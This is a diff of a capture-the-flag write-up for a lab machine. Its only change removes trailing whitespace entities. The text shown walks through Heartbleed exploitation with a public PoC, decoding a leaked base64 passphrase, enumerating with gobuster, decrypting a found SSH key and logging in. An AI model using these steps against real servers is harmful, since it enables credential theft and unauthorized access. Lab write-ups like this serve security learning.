@@ -22,9 +22,9 @@ Both the HTTP and HTTPS ports just show this image:
 
 <figure><img src="../../../.gitbook/assets/image (3833).png" alt=""><figcaption></figcaption></figure>
 
-This is a direct hint to use the Heartbleed exploit (the symbol is literally right there!). This exploit takes advantage of the OpenSSL library, allowing attackers to steal information from the memory of the target server.&#x20;
+This is a direct hint to use the Heartbleed exploit (the symbol is literally right there!). This exploit takes advantage of the OpenSSL library, allowing attackers to steal information from the memory of the target server.
 
-There are tons of PoCs online for this. I used [this](https://gist.github.com/eelsivart/10174134).&#x20;
+There are tons of PoCs online for this. I used [this](https://gist.github.com/eelsivart/10174134).
 
 ```
 $ python2 exploit.py 10.129.85.98 -p 443 
@@ -53,11 +53,11 @@ Content-Length: 42
 $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.u.....e......&
 ```
 
-We can make out some base64 at the end, and when decoded it gives `heartbleedbelievethehype`.&#x20;
+We can make out some base64 at the end, and when decoded it gives `heartbleedbelievethehype`.
 
 ### Web Enumeration
 
-I did a `gobuster` scan on the web services to see where we can use this thing.&#x20;
+I did a `gobuster` scan on the web services to see where we can use this thing.
 
 ```
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.85.98 -t 100            
@@ -78,7 +78,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /dev                  (Status: 301) [Size: 310] [--> http://10.129.85.98/dev/]
 ```
 
-Found a `/dev` endpoint.&#x20;
+Found a `/dev` endpoint.
 
 <figure><img src="../../../.gitbook/assets/image (2271).png" alt=""><figcaption></figcaption></figure>
 
@@ -86,7 +86,7 @@ The first directory contains a lot of hex characters. We can download this to a 
 
 <figure><img src="../../../.gitbook/assets/image (1176).png" alt=""><figcaption></figcaption></figure>
 
-Since we have a password, we can attempt to write decode the key via `openssl`.&#x20;
+Since we have a password, we can attempt to write decode the key via `openssl`.
 
 ```
 $ openssl rsa -in privkey.txt -out unencrypted
@@ -97,7 +97,7 @@ $ chmod 600 unencrypted
 
 Afterwards, just SSH in as `hype` using the key and grab the user flag.
 
-## Privilege Escalation&#x20;
+## Privilege Escalation
 
 After we are in, we can view the bash history file because it is rather large:
 
